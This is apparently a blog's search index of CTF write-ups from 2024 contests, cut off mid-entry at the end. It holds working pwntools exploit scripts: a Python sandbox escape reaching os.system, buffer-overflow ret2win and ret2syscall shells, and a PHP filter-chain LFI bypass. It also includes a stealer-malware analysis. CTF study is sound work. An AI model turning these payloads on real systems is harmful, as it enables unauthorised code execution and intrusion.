[{"categories":["Writeups"],"content":"CyberOdyssey 2024","date":"2024-10-22","objectID":"/easy-license/","tags":["REVERSE","CyberOdyssey",2024],"title":"easy license","uri":"/easy-license/"},{"categories":["Writeups"],"content":"Description : Crack a license for JVNE and submit it remotely to get your flag. from string import * def check_first_part(first_part): array = [''] * 8 # Equivalent to char array of size 8 in C# num = 0 while num \u003c 8: num2 = num \u0026 3 c = first_part[num] if num2 == 0: array[num] = chr(ord(c) - 7) elif num2 == 1: array[num] = chr(ord(c) \u0026 ord('f')) elif num2 == 2: array[num] = chr(ord(c) | ord('(')) elif num2 == 3: array[num] = chr(ord(c) ^ ord('a')) array[num] = chr(ord(array[num]) + ord('\\n')) # Adding newline character num += 1 value = ''.join(array) # Equivalent to new string(array) in C# return value i=0 A=\"AAAAAAAA\" c=16 res = [] while(i\u003c8): text = \"S,E{{Lw`\" value = check_first_part(A) if value[i] == text[i]: res.append(c-1) c=16 i+=1 A = list(A) try: A[i] = chr(c) except: print(\"Done\") A = \"\".join(A) c+=1 from z3 import * def solve_second_part(): # Create an array of 8-bit integer variables for each character in the second_part string second_part = [BitVec(f'second_part_{i}', 8) for i in range(8)] # Create the solver solver = Solver() # Known target string after the transformation target_string = \"{GI\u00269%@/\" # Create constraints for each character transformation based on the provided C# logic for num in range(8): # Calculate indices and shifts next_num = (num + 1) % 8 num3 = (num // 3) * 3 # Shifts and bitwise operations from the original code num4 = LShR(second_part[next_num], num3 - num + 3) num5 = (second_part[num] \u003c\u003c (num - num3 + 2)) | num4 # Apply the multiplication and modulo operation result = (num5 * ord('%') + num * 7) % 256 # Perform final bitwise manipulations shifted_result = ((result \u003c\u003c 3) | LShR(result, 1)) \u0026 0x0F final_result = shifted_result | (result \u0026 0xF0) # Add constraint that the final result for each character must match the target string solver.add(final_result == ord(target_string[num])) # Add a constraint that ensures the second_part is within ASCII range (0-127) solver.add(second_part[num] \u003e= 0, second_part[num] \u003c= 127) # Find and return the first solution if solver.check() == sat: model = solver.model() solution = [model[second_part[i]].as_long() for i in range(8)] return solution else: return None # Solve for the second_part and print the first solution solution = solve_second_part() res.append(45) res.extend(solution) # Build a bytearray directly from the list of numbers chars = bytearray(res) # Check the byte representation (optional, for debugging) print(chars) # Now send the bytearray over the connection from pwn import * host = \"rev.akasec.club\" port = 7331 # Create a connection to the server connection = remote(host, port) # Send the bytearray directly connection.sendline(chars) connection.interactive() ","date":"2024-10-22","objectID":"/easy-license/:0:0","tags":["REVERSE","CyberOdyssey",2024],"title":"easy license","uri":"/easy-license/"},{"categories":["Writeups"],"content":"Explanation Code should be obvious. First part was brute forced the trad way (chad), second part was brute forced the z3 way (nerd) and then you send your result using pwntools (sigma) ","date":"2024-10-22","objectID":"/easy-license/:1:0","tags":["REVERSE","CyberOdyssey",2024],"title":"easy license","uri":"/easy-license/"},{"categories":["Writeups"],"content":"CyberOdyssey 2024","date":"2024-10-22","objectID":"/pyjail/","tags":["MISC","CyberOdyssey",2024],"title":"pyJail","uri":"/pyjail/"},{"categories":["Writeups"],"content":"Description : here you go, some free points. import re from pwn import * def craft_num(n): \"\"\" craft symbol-only numbers, in an inefficient way \"\"\" str_0 = \"-([]\u003c[])\" str_1 = \"(-~([]\u003c[]))\" if n == 0: return str_0 ret = f\"{str_1}+\" * n return ret[:-1] def denormalize(str): ret = \"\" for c in str: if c \u003e= \"a\" and c \u003c= \"z\": # https://www.compart.com/en/unicode/U+FF41 # weird fullwidth a # the first of a sequence of codepoints compatible with ASCII letters weird_a = 0xff41 offset = ord(c) - ord(\"a\") ret += chr(weird_a + offset) else: ret += c # replace all underscores that are not at the beginning of an identifier with # https://www.compart.com/en/unicode/U+FF3F # fullwidth underscore ret = re.sub(r\"(?\u003c![\\.\\[\\( ])_\", chr(0xff3f), ret) return ret def craft_os_str(): \"\"\" payload for generating the string \"_os\" \"\"\" underscore_str = f\"().__init__.__name__[{craft_num(0)}]\" # To generate \"_\" s_str = f\"[].__doc__[{craft_num(17)}]\" # To get \"s\" br = \"{}\" o_str = f\"{br}.__class__.__base__.__doc__[{craft_num(15)}]\" # To get \"o\" os_str = f\"({underscore_str})+({o_str})+({s_str})\" return os_str def craft_bash_str(): \"\"\" payload for generating the string \"$0\" \"\"\" num_0_str = f\"({craft_num(0)}).__doc__[{craft_num(33)}]\" # To get \"0\" bash_str = f\"'$'+({num_0_str})\" return bash_str def find_loader_class_with_globals(): \"\"\" Dynamically find a loader class with access to `sys.modules`. \"\"\" for idx, cls in enumerate(object.__subclasses__()): if 'FileLoader' in str(cls): # We are now searching for the right method to access sys.modules. # The get_data method typically exists and may have access to globals. if hasattr(cls, 'get_data'): return idx return None file_loader_idx = find_loader_class_with_globals() if file_loader_idx is not None: # Access the loader class without instantiating it expl_find_FileLoader = f\"().__class__.__base__.__subclasses__()[{craft_num(file_loader_idx)}]\" else: raise Exception(\"FileLoader class not found\") # Access sys.modules via the get_data method (or similar), since we can't use get_source expl_find_os_module = f\"{expl_find_FileLoader}.get_data.__globals__[{craft_os_str()}]\" expl_shell = f\"{expl_find_os_module}.system({craft_bash_str()})\" expl = expl_shell expl = denormalize(expl) print(expl) # Connect and execute #nc misc.akasec.club 4042 #conn = process([\"python\", \"chall.py\"]) conn = remote(\"misc.akasec.club\", 4042) conn.sendlineafter(\"\u003e\", expl.encode()) conn.interactive() ","date":"2024-10-22","objectID":"/pyjail/:0:0","tags":["MISC","CyberOdyssey",2024],"title":"pyJail","uri":"/pyjail/"},{"categories":["Writeups"],"content":"Explanation Looked up on google pyjail without characters, found this https://halb.it/posts/bluehens-pyjail/, stole the code, modified it so it looks for another way to access sys.modules (cause different machines different python stuff) ","date":"2024-10-22","objectID":"/pyjail/:1:0","tags":["MISC","CyberOdyssey",2024],"title":"pyJail","uri":"/pyjail/"},{"categories":["Writeups"],"content":"CyberOdyssey 2024","date":"2024-10-22","objectID":"/spermpwn/","tags":["PWN","CyberOdyssey",2024],"title":"spermPWN","uri":"/spermpwn/"},{"categories":["Writeups"],"content":"Description : here you go, some free points. from pwn import * # Setup pwntools context for 64-bit architecture context(arch='amd64', os='linux') # Start the process #p = process('./chall') #remote nc pwn.akasec.club 2001 p = remote('pwn.akasec.club', 2001) # Load the ELF binary to extract symbols and addresses e = ELF('./chall') # Receive the line containing the address of returnToMePlease func = p.recvline() # The output is something like: b'return to me please : 5555555551c9\\n' # We need to extract the address part (ascii string) from the line func = func[24:len(func)-1] # Extract '5555555551c9' from the output # Convert the ASCII address string to an integer func_addr = int(func, 16) # Add 45 to the extracted address new_func_addr = func_addr + 45 # Convert the new address to little-endian format using p64 new_func_addr_packed = p64(new_func_addr) # Create the payload padding = b\"A\" * 24 # Overflow buffer + overwrite return address payload = padding + new_func_addr_packed # Attach GDB to the running process and set a breakpoint at main+99 # Send the payload p.sendline(payload) # Drop into interactive mode to see the output p.interactive() ","date":"2024-10-22","objectID":"/spermpwn/:0:0","tags":["PWN","CyberOdyssey",2024],"title":"spermPWN","uri":"/spermpwn/"},{"categories":["Writeups"],"content":"Explanation at new_func_addr+0, you’ll never spawn a shell because we fill a register with 0 then we compare it with 0x1337. But that’s like having your front door locked but your back door opened…So let’s just go through the back door new_func_addr+45 (As in after the comparison). ","date":"2024-10-22","objectID":"/spermpwn/:1:0","tags":["PWN","CyberOdyssey",2024],"title":"spermPWN","uri":"/spermpwn/"},{"categories":["Writeups"],"content":"CyberOdyssey 2024","date":"2024-10-22","objectID":"/trenbolone-acetate/","tags":["CRYPTO","CyberOdyssey",2024],"title":"Trenbolone Acetate","uri":"/trenbolone-acetate/"},{"categories":["Writeups"],"content":"Description : The secret sauce for an absolute jacked body. Don’t do steroids it’s a joke. from Crypto.Util.number import long_to_bytes, inverse import math e = 65537 p = 151540898923253505685929590839467610476539231339984453937399928757529520395167994115755166265617251672043185236161363121625933790823240632902021976254031919968575780199199933705267309277878642940651911668712031181453138874513134847392060819408927032892075325270040952708055668741089143717243401303024555257629 encrypted_flag = 6213061180807192415739815333711016988111562303576135330339470059636408074233112487974290853453944378795500648677454310446831080497598536706308919525130382753041308868210555124865365563894231295209406847789139700492617579246791656727794473752764509494122894702123815772569604098471223813782846144047797979345657520483768475791533230791945222842019364670025158190913224854906787657918233677470378026864737296003543227092898384260242969295669650666604488234803081911325558300779526933331511863143988203774745078791286082201176111789407843617087871737182907131976391354352710947506894124712039162324355615970591583578136285884937844591383316460927831119585248295867355518509118831884764827136450010450070265934343691512433524253284928056060091863105849427461369084596539365748642269821391069443866947839616617351739194341117874963950999060124423407441986734132777478083380760473818314838907885843416124676073709655697628403940360968329734360698993661069109722652085496217898423581953205675947718658390795984512062315552317284667690291714469332076299928703391123609350229812485073956041537114028693285475534879628541868617415579992513986642645468833134784231548588984583903835506260531485187800884610679006213100276630339935307150840952713226249931347532045279278215118268385438992250167366269364930946776931389707265502617991108272482670049967105916988888196192859145687509443461186546981510212177501403044418734379759866209723988502606650698445197672529550740315841079862462848534890363809808147377969999560650786221609540304215577993832437196076220744854212702357414546474210605007061113768125837998154189437819203395998510682587941813929433690137095039848084275613972569115237430172703725421367870902993217062907651946128156975591060719852179498213781649011210807237786454815148859194333173193535584082036526067601931323295549369318013515331485172565014950142728200895734651177906250582137670643784513069880832868712423994761333922538304256565697950019163243512102041878559525424518292521612463747754206435564607109912503072216355195489435467099715999255786521948035632410782145850098311065196718416613187441259174861642932047618586688615144619942513479257014417375749254071371536837276997981830243431176791130067739922279581006906811439182648373315921829956514675181203100716700296328787784654386973536345708377536777325133138012365191286732153448547158606700330386833427709248492153511009424456908274963888305035862038933783555402758802731236206121743493634976645526593964689650850895006744203254360944099623965294098736288289053351829469878613135685051999269391849332886444375852690243335974954104494706310895852193958453480881886753137400081873243574388352939211059156296616533689473375846657511230737348968608765369142698806368424200472061900066176512895073185370303590650583228568588583229494975704890960433202469936071967773972676837762662453225024068513452914148946088893961322646101833731972818916704089977744043610532409071754034138085086572181258717069378271881693426890750743179781467837934857210199903393615433162899024580917392568477939895841806361456726090429048829896559086300411931100777178616679944803681014429533466350600732822642994197179853540831724559066366766494412090375596647534610400832392552316461019373504680275883777426106658114855731927413282886197946777560407557517544739953940084236069408451773660814107559154417433422545300933230558417644515040552169031258221109881882517428793692629491168852433274853395006581379865407634805445096595729283963926565977738974108760476989","date":"2024-10-22","objectID":"/trenbolone-acetate/:0:0","tags":["CRYPTO","CyberOdyssey",2024],"title":"Trenbolone Acetate","uri":"/trenbolone-acetate/"},{"categories":["Writeups"],"content":"Explanation I’m not a crypto player, this was pure luck. Sometimes you just have to trust nature, one could hit a Rubik’s cube with a wrench and it’ll solve itself. Read the sentence again, it is technically true isn’t it ? If I had to guess, I think the fact that n is not the usual p*q, and the equation could reduce from : [ \\text{C} = M^e + p_0 \\cdot q_0 \\cdot p_1 \\cdot q_1 ] to : [ \\text{C} \\mod p_1 = M^e \\mod p_1 ] so we could use p1 to decrypt our flag. ","date":"2024-10-22","objectID":"/trenbolone-acetate/:1:0","tags":["CRYPTO","CyberOdyssey",2024],"title":"Trenbolone Acetate","uri":"/trenbolone-acetate/"},{"categories":["Writeups"],"content":"DEADFACE 2024","date":"2024-10-22","objectID":"/winning-factors/","tags":["MISC","DEADFACE",2024],"title":"Winning Factors","uri":"/winning-factors/"},{"categories":["Writeups"],"content":"Description : As another test of your programming prowess, Turbo Tactical wants to see if you can write a script to solve mathematic equations being served by a remote server within 3 seconds. #147.182.245.126:33001 #setup pwntools from pwn import * from math import * #connect to the server conn = remote('147.182.245.126', 33001) p = conn.recvline() print(p) n = len(p) number = int(p[27:n-2]) f = factorial(number) print(f) conn.send(str(f).encode()) conn.interactive() ","date":"2024-10-22","objectID":"/winning-factors/:0:0","tags":["MISC","DEADFACE",2024],"title":"Winning Factors","uri":"/winning-factors/"},{"categories":["Writeups"],"content":"Explanation","date":"2024-10-22","objectID":"/winning-factors/:1:0","tags":["MISC","DEADFACE",2024],"title":"Winning Factors","uri":"/winning-factors/"},{"categories":["Writeups"],"content":"CSAW 2024 - Obfuscation","date":"2024-10-11","objectID":"/obfuscation/","tags":["REVERSE","CSAW",2024],"title":"Obfuscation","uri":"/obfuscation/"},{"categories":["Writeups"],"content":"The goal of this challenge is to reverse this highly obfuscated binary and get the correct passphrase ","date":"2024-10-11","objectID":"/obfuscation/:0:0","tags":["REVERSE","CSAW",2024],"title":"Obfuscation","uri":"/obfuscation/"},{"categories":["Writeups"],"content":"Explanation The program asks for a passphrase, because of that and the name of the program I assumed there would some passphrase obfuscated, so I decompiled it : Couldn’t understand anything so I checked if maybe it was packed ? Nope, okay we’ll let’s use BinaryNinja then : 93A3 is our function, so let’s set a breakpoint at the start of it and see what happens to our input : Before : After : Interesting, looks like there’s a mapping function, I sent another input just to make sure and it’s probably the case : Before : After : But then I got stuck So I tried strace and saw this : I needed to find where this happens, so I went back and checked if rand gets called Let’s put a breakpoint on rand and spam continue until I find which function calls it and there it is : at 818e6 now we’ll see what happens with this rand call after spamming it after 34 times we finally stop calling rand, this probably means that the flag is 34 characters long. What I did was make rand always return 0 and see what happens. After trial and error, I found this line that compares our result with the expected result : “0xcd” is our input since A turns to 0xcd and we are comparing it with 0xa5 so there’s probably a xor with the LSB of the rand value, let’s try setting back to generating random values. let’s input “a” : Then I wondered : how can I solve this challenge if the values are random each time yet the compared value is always the same ? so I wrote “a” again : Same result. So it looks like I’ll have to resort to the old reliable : guessing one character at a time. After hours I finally found it : wh47 15 7h3 r1ck 457l3y p4r4d0x? Fun. ","date":"2024-10-11","objectID":"/obfuscation/:1:0","tags":["REVERSE","CSAW",2024],"title":"Obfuscation","uri":"/obfuscation/"},{"categories":["Writeups"],"content":"R code (worst language ever)","date":"2024-09-02","objectID":"/blackhatmea-2024-rd-what-now/","tags":["REV","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - RD What Now?","uri":"/blackhatmea-2024-rd-what-now/"},{"categories":["Writeups"],"content":"I have some files missing but I think I can figure it out anyways. ","date":"2024-09-02","objectID":"/blackhatmea-2024-rd-what-now/:0:0","tags":["REV","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - RD What Now?","uri":"/blackhatmea-2024-rd-what-now/"},{"categories":["Writeups"],"content":"Explanation Typical “Z3 solver/whole lotta conditions” challenge, but written in R. We start with a file that contains a bunch of zlib files. We can use binwalk to extract these files. The files contain a bunch of non sense and couple strings like 0.0.9000, quick google search and we find that it has something to do with R : Now apparently in R you can read these “rds” files : And there you go, a bunch of functions that tell you what each character in the flag string should equal to, you can use a z3solver script to get the flag…I don’t have a script because I manually calculated everything by hand. Then there’s the big xor function function () { if (exists(\"flag\", envir = .GlobalEnv)) { flag_value \u003c- get(\"flag\", envir = .GlobalEnv) if (is.character(flag_value)) { xor_key \u003c- \"BHMEAISTHEBESTCTFEVERBETTERTHANALLOFTHEOTHERCTF\" key_length \u003c- nchar(xor_key) flag_length \u003c- nchar(flag_value) if (flag_length != key_length) { xor_key \u003c- substr(rep(xor_key, length.out = ceiling(flag_length/key_length)), 1, flag_length) } xor_result \u003c- sapply(1:flag_length, function(i) { flag_char \u003c- substr(flag_value, i, i) key_char \u003c- substr(xor_key, i, i) int_val \u003c- as.integer(charToRaw(flag_char)) xor_val \u003c- as.integer(charToRaw(key_char)) xored_val \u003c- bitwXor(int_val, xor_val) as.raw(xored_val) }) return(paste0(xor_result, collapse = \"\")) } } else { system(\"echo 'try better next time'\") } } Run the function and get the flag (or rewrite it in another language if you want) (Keep in mind the non xored flag should be in hexadecimal and not as a string for this xor operation to work.) ","date":"2024-09-02","objectID":"/blackhatmea-2024-rd-what-now/:1:0","tags":["REV","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - RD What Now?","uri":"/blackhatmea-2024-rd-what-now/"},{"categories":["Writeups"],"content":"Some russian malware","date":"2024-09-02","objectID":"/blackhatmea-2024-stealer/","tags":["REV","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Stealer","uri":"/blackhatmea-2024-stealer/"},{"categories":["Writeups"],"content":"We received a phishing email within which we have found this file. We believe this executable acts as some sort of credential stealer. Note: This is a defused real malware, consider disabling your AV. ","date":"2024-09-02","objectID":"/blackhatmea-2024-stealer/:0:0","tags":["REV","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Stealer","uri":"/blackhatmea-2024-stealer/"},{"categories":["Writeups"],"content":"Explanation The file is a .Net 32-bit executable, therefore we can use DnSpy to decompile it. You’ll find that it’s a bunch of obfuscated code, so we’ll use a tool called de4dot to clean our code. Inside the code there’s this interesting function that always gets called whenever the code gathers data from the victim : // Token: 0x06000044 RID: 68 public static string smethod_16(string string_30, string string_31) { string text = \"\"; try { DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider(); HashAlgorithm hashAlgorithm = new MD5CryptoServiceProvider(); byte[] array = new byte[8]; Array.Copy(hashAlgorithm.ComputeHash(Encoding.ASCII.GetBytes(string_31)), 0, array, 0, 8); descryptoServiceProvider.Key = array; descryptoServiceProvider.Mode = CipherMode.ECB; ICryptoTransform cryptoTransform = descryptoServiceProvider.CreateDecryptor(); byte[] array2 = Convert.FromBase64String(string_30); text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length)); } catch (Exception) { } Console.WriteLine(\"probably flag\"); Console.WriteLine(text); return text; } I added the console lines to extract the content of text so whenever the function is called we get to see what’s happening. I ran the code and got this : 7267561120:QkhGbGFnWXt0M2xlZ3I0bV9nMGVzX3chbGR9 QkhGbGFnWXt0M2xlZ3I0bV9nMGVzX3chbGR9 is the flag in base64. ","date":"2024-09-02","objectID":"/blackhatmea-2024-stealer/:1:0","tags":["REV","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Stealer","uri":"/blackhatmea-2024-stealer/"},{"categories":["Writeups"],"content":"php filter chain exploit","date":"2024-09-02","objectID":"/blackhatmea-2024-free-flag/","tags":["WEB","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Free Flag","uri":"/blackhatmea-2024-free-flag/"},{"categories":["Writeups"],"content":"Free Free ","date":"2024-09-02","objectID":"/blackhatmea-2024-free-flag/:0:0","tags":["WEB","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Free Flag","uri":"/blackhatmea-2024-free-flag/"},{"categories":["Writeups"],"content":"Explanation Let’s take a look at the code : \u003c?php function isRateLimited($limitTime = 1) { $ipAddress=$_SERVER['REMOTE_ADDR']; $filename = sys_get_temp_dir() . \"/rate_limit_\" . md5($ipAddress); $lastRequestTime = @file_get_contents($filename); if ($lastRequestTime !== false \u0026\u0026 (time() - $lastRequestTime) \u003c $limitTime) { return true; } file_put_contents($filename, time()); return false; } if(isset($_POST['file'])) { if(isRateLimited()) { die(\"Limited 1 req per second\"); } $file = $_POST['file']; if(substr(file_get_contents($file),0,5) !== \"\u003c?php\" \u0026\u0026 substr(file_get_contents($file),0,5) !== \"\u003chtml\") { die(\"catched\"); } else { echo file_get_contents($file); } } ?\u003e ","date":"2024-09-02","objectID":"/blackhatmea-2024-free-flag/:1:0","tags":["WEB","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Free Flag","uri":"/blackhatmea-2024-free-flag/"},{"categories":["Writeups"],"content":"Vulnerability There’s an LFI vulnerability in the code : $file = $_POST['file']; if(substr(file_get_contents($file),0,5) !== \"\u003c?php\" \u0026\u0026 substr(file_get_contents($file),0,5) !== \"\u003chtml\") { die(\"catched\"); } else { echo file_get_contents($file); } our input is stored in $file, the “filter” just checks if the file starts with \u003c?php or \u003chtml, we can manage to craft a malicious payload that would bypass the condition. ","date":"2024-09-02","objectID":"/blackhatmea-2024-free-flag/:1:1","tags":["WEB","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Free Flag","uri":"/blackhatmea-2024-free-flag/"},{"categories":["Writeups"],"content":"Wrapwrap This is a tool that generates a php://filter chain that adds a prefix and a suffix to the contents of a file. Once you generate the chain, send a post request, I personally used CURL : curl -X POST -d \"file=$(\u003cchain.txt)\" http://websiteorwhatever.com ","date":"2024-09-02","objectID":"/blackhatmea-2024-free-flag/:1:2","tags":["WEB","BlackHatMEA",2024],"title":"BlackHatMEA 2024 - Free Flag","uri":"/blackhatmea-2024-free-flag/"},{"categories":["Writeups"],"content":"AmateursCTF 2024 - Less suspicious RSA","date":"2024-08-27","objectID":"/less-suspicious-rsa/","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Less suspicious RSA","uri":"/less-suspicious-rsa/"},{"categories":["Writeups"],"content":"I need help factoring this modulus, it looks less suspicious, but I can’t factor using any conventional methods. from math import sqrt from decimal import * from Crypto.Util.number import * import gmpy2 from gmpy2 import mpz, is_prime getcontext().prec = 100 # Change the precision def factorial(n): if n == 0: return 1 return factorial(n-1) * n def nextPrime(p, n): p += (n - p) % n p += 1 iters = 0 while not isPrime(p): p += n return p n = 138963980427736364646203557164328211078134463518489686365728312873583832517087170768576679472472907142081360480944201759920246566585465801088226164314480607014663211599932950864391702460227584467326051919881067028851940610382044445003060103566003934601979805899293539507221062915314813557293919231917284247667 iter =0 p = int(sqrt(n)) while (not isPrime(p)): p += 1 iter += 1 #print(iter) q = n//p print(q) print(p) n = p*q print(n) ","date":"2024-08-27","objectID":"/less-suspicious-rsa/:0:0","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Less suspicious RSA","uri":"/less-suspicious-rsa/"},{"categories":["Writeups"],"content":"Explanation Computes square root of n -\u003e finds the nearest prime p greater than or equal to the square root -\u003e calculates q as n divided by p -\u003e verifies by recomputing n as p * q. ","date":"2024-08-27","objectID":"/less-suspicious-rsa/:1:0","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Less suspicious RSA","uri":"/less-suspicious-rsa/"},{"categories":["Writeups"],"content":"AmateursCTF 2024 - Typo","date":"2024-08-27","objectID":"/typo/","tags":["REVERSE","AmateursCTF",2024],"title":"AmateursCTF 2024 - Typo","uri":"/typo/"},{"categories":["Writeups"],"content":"can you make sure i didn’t make a typo? import random as ran intVar = int('1665663c', 20) ran.seed(intVar) padding = '\\r'r'\\r''r''\\\\r'r'\\\\r\\r'r'r''r''\\\\r'r'r\\r'r'r\\\\r''r'r'r''r''\\\\r'r'\\\\r\\r'r'r''r''\\\\r'r'rr\\r''\\r''r''r\\\\'r'\\r''\\r''r\\\\\\r'r'r\\r''\\rr' pay = [ b'arRRrrRRrRRrRRrRr', b'aRrRrrRRrRr', b'arRRrrRRrRRrRr', b'arRRrRrRRrRr', b'arRRrRRrRrrRRrRR' b'arRRrrRRrRRRrRRrRr', b'arRRrrRRrRRRrRr', b'arRRrrRRrRRRrRr' b'arRrRrRrRRRrrRrrrR', ] def lamfunc(y): return bytearray([x - 1 for x in y]) def res(y): return bytearray([x + 1 for x in y]) def handle(hex): for list in range(1, len(hex) - 1, 2): hex[list], hex[list + 1] = hex[list + 1], hex[list] for id in range(0, len(hex) - 1, 2): hex[id], hex[id + 1] = hex[id + 1], hex[id] return hex randres = [handle, lamfunc, res] randres = [ran.choice(randres) for x in range(128)] def reverse(ar_int): chars = \"0123456789abcdefg\" hex_str = '' while ar_int \u003e 0: remainder = ar_int % 17 hex_str = chars[remainder] + hex_str ar_int = ar_int // 17 bytes_ar = bytearray.fromhex(hex_str) return bytes_ar def handle(arr, ar): ar = int(ar, 16) for r in arr[::-1]: ar -= int(r, 35) return reverse(ar) def ran(arr, ar): for r in ar[::-1]: arr = randres[r](arr) return arr re = '5915f8ba06db0a50aa2f3eee4baef82e70be1a9ac80cb59e5b9cb15a15a7f7246604a5e456ad5324167411480f893f97e3' flag = handle(pay,re) randomfunc = ran(flag, padding.encode()) print(randomfunc.decode()) ","date":"2024-08-27","objectID":"/typo/:0:0","tags":["REVERSE","AmateursCTF",2024],"title":"AmateursCTF 2024 - Typo","uri":"/typo/"},{"categories":["Writeups"],"content":"Explanation Converts a hexadecimal string to integer -\u003e applies a series of random operations on a byte array based on random choices -\u003e transforms the result back to a byte array and decodes it to a string. ","date":"2024-08-27","objectID":"/typo/:1:0","tags":["REVERSE","AmateursCTF",2024],"title":"AmateursCTF 2024 - Typo","uri":"/typo/"},{"categories":["Writeups"],"content":"AmateursCTF 2024 - Unsuspicious RSA","date":"2024-08-27","objectID":"/unsuspicious-rsa/","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Unsuspicious RSA","uri":"/unsuspicious-rsa/"},{"categories":["Writeups"],"content":"I need help factoring this modulus, it looks suspicious, but I can’t factor using any conventional methods. from math import sqrt from decimal import * from Crypto.Util.number import * import gmpy2 from gmpy2 import mpz, is_prime getcontext().prec = 100 # Change the precision def factorial(n): if n == 0: return 1 return factorial(n-1) * n def nextPrime(p, n): p += (n - p) % n p += 1 iters = 0 while not isPrime(p): p += n return p n = 172391551927761576067659307357620721422739678820495774305873584621252712399496576196263035396006999836369799931266873378023097609967946749267124740589901094349829053978388042817025552765214268699484300142561454883219890142913389461801693414623922253012031301348707811702687094437054617108593289186399175149061 iter =0 p = int(sqrt(n)) while (not isPrime(p)): p += 1 iter += 1 print(iter) q = nextPrime(p, factorial(90)) print(q) p = n//q print(p) t = nextPrime(p, factorial(90)) print(t==q) print(p*q == n) ","date":"2024-08-27","objectID":"/unsuspicious-rsa/:0:0","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Unsuspicious RSA","uri":"/unsuspicious-rsa/"},{"categories":["Writeups"],"content":"Explanation Finds prime factors of a large number n using high-precision arithmetic -\u003e initializes p as the square root of n and finds the nearest prime -\u003e finds the next prime q with a step size of 90 factorial -\u003e calculates p and verifies p * q equals n -\u003e checks if the next prime after p equals q. ","date":"2024-08-27","objectID":"/unsuspicious-rsa/:1:0","tags":["CRYPTO","AmateursCTF",2024],"title":"AmateursCTF 2024 - Unsuspicious RSA","uri":"/unsuspicious-rsa/"},{"categories":["Writeups"],"content":"Cygenix CTF 2024 - Classic","date":"2024-08-27","objectID":"/classic/","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Classic","uri":"/classic/"},{"categories":["Writeups"],"content":"Every vulnerability is a door, and some doors lead to treasures. #setup pwntools from pwn import * context(arch='amd64', os='linux') #context.log_level = 'debug' #context.terminal = ['tmux', 'splitw', '-h'] #setup binary exe = ELF('./main') p = process(exe.path) #nc chall.ycfteam.in 3333 #p = remote('chall.ycfteam.in', 3333) #p = gdb.debug(exe.path) # Calculate the offset to the return address offset = 40 # 32 bytes for the buffer + 8 bytes for saved RBP # Find the address of the win function (replace with the correct function) win_addr = exe.symbols['win'] # Assuming there's a win function # Print the win function address print(\"win function address: \" + hex(win_addr)) # get the ret address ret_addr = 0x40116C context.log_level = 'debug' # Craft the payload payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP ret_addr, # Overwrite return address with win() function address win_addr # Overwrite return address with win() function address ) # Print the payload print(payload) # Send the payload p.sendline(payload) # Interact with the program p.interactive() ","date":"2024-08-27","objectID":"/classic/:0:0","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Classic","uri":"/classic/"},{"categories":["Writeups"],"content":"Explanation Simple ret2win, buffer overflow -\u003e ret -\u003e win -\u003e remote shell ","date":"2024-08-27","objectID":"/classic/:1:0","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Classic","uri":"/classic/"},{"categories":["Writeups"],"content":"Cygenix CTF 2024 - Classic","date":"2024-08-27","objectID":"/gadgets/","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Gadgets","uri":"/gadgets/"},{"categories":["Writeups"],"content":"Even the strongest defenses have cracks; find them. #setup pwntools from pwn import * context(arch='amd64', os='linux') #context.log_level = 'debug' #context.terminal = ['tmux', 'splitw', '-h'] context.log_level = 'debug' #setup binary exe = ELF('./main') p = process(exe.path) #nc chall.ycfteam.in 3333 #p = remote('chall.ycfteam.in', 3333) #p = gdb.debug(exe.path) # Calculate the offset to the return address offset = 40 # 32 bytes for the buffer + 8 bytes for saved RBP # get the ret address using ropgadget rop = ROP(exe) # pop rdi pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] # Print the pop rdi gadget log.info(f\"pop rdi gadget: {hex(pop_rdi)}\") # pop rsi pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0] # Print the pop rsi gadget log.info(f\"pop rsi gadget: {hex(pop_rsi)}\") # pop rdx pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0] # Print the pop rdx gadget log.info(f\"pop rdx gadget: {hex(pop_rdx)}\") # pop rax pop_rax = rop.find_gadget(['pop rax', 'ret'])[0] # Print the pop rax gadget log.info(f\"pop rax gadget: {hex(pop_rax)}\") # search for bin/sh bin_sh = next(exe.search(b\"/bin/sh\\x00\")) # get syscall address from win function syscall = 0x401159 # Craft the payload payload = flat( b'A' * offset, # Overflow buffer and overwrite RBP pop_rax, 0x3b, pop_rdi, bin_sh, pop_rsi, 0, pop_rdx, 0, syscall ) # Print the payload print(payload) # Send the payload p.sendline(payload) # Interact with the program p.interactive() ","date":"2024-08-27","objectID":"/gadgets/:0:0","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Gadgets","uri":"/gadgets/"},{"categories":["Writeups"],"content":"Explanation Simple ret2syscall, buffer overflow -\u003e control registers (RAX, RDI, RSI, RDX) -\u003e execute syscall -\u003e spawn /bin/sh shell ","date":"2024-08-27","objectID":"/gadgets/:1:0","tags":["PWN","CygenixCTF",2024],"title":"Cygenix CTF 2024 - Gadgets","uri":"/gadgets/"},{"categories":["Writeups"],"content":"HTB Cyber-Apocalypse 2024 - Colored Squares","date":"2024-08-27","objectID":"/colored-squares/","tags":["MISC","HTB",2024],"title":"HTB Cyber-Apocalypse 2024 - Colored 